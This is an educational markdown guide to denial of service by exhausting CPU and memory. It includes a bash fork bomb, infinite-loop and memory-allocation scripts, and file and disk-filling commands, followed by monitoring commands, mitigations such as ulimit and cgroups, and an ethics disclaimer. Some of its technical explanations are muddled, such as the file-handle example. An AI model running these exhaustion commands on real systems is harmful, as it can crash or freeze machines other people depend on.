# DoS Using Programs and Commands (CPU and Memory Utilization)

Denial of Service (DoS) attacks can be performed by exploiting CPU and memory resources of a target system or server. These attacks aim to overwhelm the system's resources, causing performance degradation or complete unavailability.

---

## **Techniques to Execute DoS via CPU and Memory Utilization**

### 1. **CPU Exhaustion**
   High CPU utilization can prevent the target system from processing legitimate requests.

   - **Fork Bomb**  
     Recursively creates processes until the CPU is overwhelmed.  
     ```bash
     :(){ :|:& };:
     ```
     - This command creates a large number of child processes.
     - It is highly dangerous and should never be executed on a production system.

   - **Infinite Loops**  
     Writing scripts or programs that create infinite CPU-bound loops:  
     ```python
     while True:
         pass
     ```

   - **Heavy Computation Tasks**  
     Running resource-heavy computations repeatedly on the target machine:
     ```bash
     yes > /dev/null &
     ```

---

### 2. **Memory Exhaustion**
   Memory exhaustion attacks involve consuming all available RAM, leading to crashes or severe slowdowns.

   - **Resource Allocation Overload**  
     Allocating large memory chunks in programs:
     ```python
     arr = []
     while True:
         arr.append(' ' * 10**6)  # Allocate 1 MB repeatedly
     ```

   - **Opening Too Many Files**  
     Using the `ulimit` command to restrict the number of open files, followed by scripts to open files indefinitely:
     ```bash
     ulimit -n 100
     while true; do
         touch temp_$(date +%s%N)
     done
     ```

   - **Disk Fillers**  
     Filling up the disk to exhaust system memory swap space:
     ```bash
     dd if=/dev/zero of=/tmp/bigfile bs=1M count=1024
     ```

---

## **Commands to Monitor DoS Effects**

### **System Monitoring Commands**
1. **CPU Utilization**
   - View CPU usage in real-time:
     ```bash
     top
     htop
     ```

2. **Memory Utilization**
   - Check memory consumption:
     ```bash
     free -h
     vmstat 1
     ```

3. **Process Management**
   - List running processes sorted by resource usage:
     ```bash
     ps aux --sort=-%cpu
     ps aux --sort=-%mem
     ```

4. **Network Monitoring**
   - View network connections to detect unusual traffic:
     ```bash
     netstat -an
     ```

---

## **Mitigating DoS Attacks on CPU and Memory**

1. **Limit Resource Utilization Per User**
   - Use `ulimit` to restrict CPU and memory usage for individual users:
     ```bash
     ulimit -u 100    # Limit number of processes
     ulimit -v 50000  # Limit virtual memory usage (in KB)
     ```

2. **Kill Rogue Processes**
   - Identify and terminate offending processes:
     ```bash
     kill -9 <PID>
     ```

3. **Implement Monitoring Tools**
   - Use tools like `Nagios`, `Zabbix`, or `Prometheus` to monitor system resources.

4. **Deploy Resource Throttling**
   - Install tools like `cgroups` (Linux) to limit CPU and memory usage for processes.

5. **Use Load Balancers**
   - Distribute traffic across multiple servers to reduce individual system load.

6. **Periodic Maintenance**
   - Regularly update system configurations and apply security patches.

---

## **Ethical Considerations**

Running such programs or commands on any system without authorization is illegal and unethical. These examples are for educational purposes only to understand the mechanics and implement effective defenses. Always test in a controlled, isolated environment.

---
